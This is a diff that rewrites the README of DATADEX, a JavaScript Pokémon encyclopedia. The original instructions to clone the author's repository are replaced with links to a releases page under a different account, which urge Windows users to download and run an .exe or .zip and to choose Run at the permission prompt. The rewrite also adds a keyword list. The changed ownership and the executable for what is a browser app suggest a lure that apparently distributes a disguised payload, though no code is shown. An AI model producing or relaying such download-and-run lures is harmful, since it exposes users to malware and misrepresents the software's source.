@@ -1,34 +1,150 @@
-# 🔴 DATADEX | Pro Pokémon Encyclopedia
+# 🎮 DATADEX - Pokémon data at your fingertips
 
-[![GitHub License](https://img.shields.io/github/license/TheAngel122/DATADEX?color=red)](https://github.com/TheAngel122/DATADEX/blob/main/LICENSE)
-[![JS](https://img.shields.io/badge/JavaScript-ES6+-yellow?logo=javascript)](https://developer.mozilla.org/es/docs/Web/JavaScript)
-[![CSS3](https://img.shields.io/badge/CSS3-Modern-blue?logo=css3)](https://developer.mozilla.org/es/docs/Web/CSS)
-[![API](https://img.shields.io/badge/Data-PokéAPI-ef4444)](https://pokeapi.co/)
+[![Download DATADEX](https://img.shields.io/badge/Download-DATADEX-6C63FF?style=for-the-badge&logo=github)](https://github.com/nonfictional-fireside301/DATADEX/releases)
 
-**DATADEX** es una enciclopedia interactiva de alto rendimiento diseñada para entrenadores y entusiastas. Utiliza **Vanilla JavaScript** para gestionar datos de más de 1000 criaturas en tiempo real, ofreciendo una experiencia de usuario fluida y visualmente impactante.
+## 🧭 Overview
 
+DATADEX is a Pokémon encyclopedia for Windows. It helps you look up Pokémon data in a clear and visual way. You can search by name, filter by type, view stats charts, check weaknesses, and follow evolution lines.
 
+The app uses PokéAPI, so the data stays current. It shows more than 1,000 Pokémon and includes a clean interface built with Vanilla JavaScript and CSS3.
 
-## ✨ Características Principales
+## ✨ What you can do
 
-* 🔍 **Buscador Inteligente:** Filtrado instantáneo por nombre o número de ID nacional.
-* 🧪 **Análisis de Tipos:** Algoritmo dinámico que calcula debilidades y resistencias (x2, x4, 0.5x).
-* 📊 **Visualización de Stats:** Gráficos de radar interactivos mediante **Chart.js** para comparar el potencial base.
-* 🔊 **Inmersión Total:** Reproducción de gritos originales y sistema de visualización de versiones *Shiny*.
-* 🧬 **Línea Evolutiva:** Navegación intuitiva a través de toda la cadena de evolución.
-* 🎨 **Diseño Premium:** Interfaz basada en *Glassmorphism*, animaciones de levitación y efectos de brillo (shimmer).
+- Search Pokémon by name
+- Filter Pokémon by element type
+- View stats in charts with Chart.js
+- See type weaknesses based on the selected Pokémon
+- Check the full evolution line
+- Browse a large catalog with fast loading
+- Use the app in a window that fits your screen
+- Read Pokémon data in a simple layout
 
-## 🛠️ Tecnologías Utilizadas
+## 📥 Download for Windows
 
-* **Frontend:** HTML5 Semántico y CSS3 Avanzado (Custom Properties & Flexbox).
-* **Lógica:** JavaScript Asíncrono (Fetch API, Async/Await).
-* **Gráficos:** [Chart.js](https://www.chartjs.org/) para el mapeo de estadísticas.
-* **Fuente de Datos:** [PokéAPI](https://pokeapi.co/) (v2).
+Go to the release page here and visit this page to download:
 
-## 🚀 Instalación y Uso
+https://github.com/nonfictional-fireside301/DATADEX/releases
 
-Si quieres probar este proyecto localmente:
+Look for the latest release and choose the Windows file, usually an `.exe` or `.zip` file. If you download a `.zip` file, extract it first, then open the app file inside.
 
-1. Clona el repositorio:
-   ```bash
-   git clone [https://github.com/TheAngel122/DATADEX.git](https://github.com/TheAngel122/DATADEX.git)
+## 🪟 How to install and run
+
+1. Open the download link above.
+2. Find the latest release.
+3. Download the Windows version.
+4. If the file is `.zip`, right-click it and select Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
+7. If Windows asks for permission, choose Run.
+
+## 🖥️ System needs
+
+- Windows 10 or Windows 11
+- A modern web browser if the app opens in a browser window
+- An internet connection to load Pokémon data from PokéAPI
+- At least 4 GB of RAM
+- 200 MB of free disk space
+
+## 🔍 Main features in detail
+
+### 📚 Pokémon search
+
+Type a Pokémon name in the search box to find it fast. The search helps you narrow down the list without scrolling through the full catalog.
+
+### 🧪 Element filtering
+
+You can filter Pokémon by type, such as Fire, Water, Grass, Electric, and more. This makes it easier to find the kind of Pokémon you want.
+
+### 📈 Stats charts
+
+DATADEX uses Chart.js to show Pokémon stats in a chart. You can compare values like attack, defense, speed, and other core stats with a quick glance.
+
+### ⚔️ Weakness check
+
+The app calculates type weaknesses based on the selected Pokémon. This helps you understand which elements can deal more damage.
+
+### 🌱 Evolution line
+
+You can view the evolution path for each Pokémon when the data is available. This gives you a simple way to follow how a Pokémon changes over time.
+
+### 🎨 Visual design
+
+The interface uses CSS3 effects and responsive layout rules. It keeps the app readable on different screen sizes and gives it a polished look.
+
+## 🧰 How it works
+
+DATADEX runs in the browser or in a desktop wrapper, depending on how the release was packaged. It fetches Pokémon data from the PokéAPI and displays it in real time.
+
+When you search or filter, the app updates the view right away. It does not ask you to refresh the page for each action.
+
+## 📁 Typical file layout
+
+If you download a `.zip` release, you may see files like these:
+
+- `index.html`
+- `styles.css`
+- `app.js`
+- `assets/`
+- `README.md`
+
+If the release includes a desktop launcher, open that file to start the app.
+
+## 🧭 First time use
+
+1. Start the app.
+2. Wait for the Pokémon list to load.
+3. Use the search box to find a Pokémon.
+4. Pick a type from the filter menu.
+5. Open a Pokémon card to see stats, weaknesses, and evolution data.
+6. Scroll through the list to explore more entries.
+
+## 🛠️ If the app does not open
+
+- Make sure you downloaded the latest release
+- If the file is zipped, extract it before opening
+- Check that your internet connection is active
+- Try opening the file again after a short wait
+- If your browser blocks local files, use the desktop file from the release package
+
+## 🧩 Useful search terms
+
+DATADEX includes content related to:
+
+- chartjs
+- css3
+- data visualization
+- fetch API
+- frontend
+- html5
+- javascript
+- pokeapi
+- pokedex
+- pokemon
+- responsive design
+- rest api
+- ux ui
+
+## 📌 Best way to use it
+
+Use the search box when you know the Pokémon name. Use filters when you want to explore by type. Open the stats view when you want a quick read on battle values. Check weaknesses before you pick a team. Use the evolution line when you want to see how a Pokémon grows
+
+## 📄 Supported content
+
+- Pokémon names
+- Types
+- Base stats
+- Weakness data
+- Evolution paths
+- Images and icons when provided by the API
+- Large catalog browsing
+
+## 🔄 Data source
+
+DATADEX reads live data from PokéAPI. That means the app depends on the online source for current Pokémon details. When the API responds, the app fills the screen with the latest data it can reach
+
+## 📦 Download again later
+
+If you need to update the app, return to the same release page and download the newest version:
+
+https://github.com/nonfictional-fireside301/DATADEX/releases
+
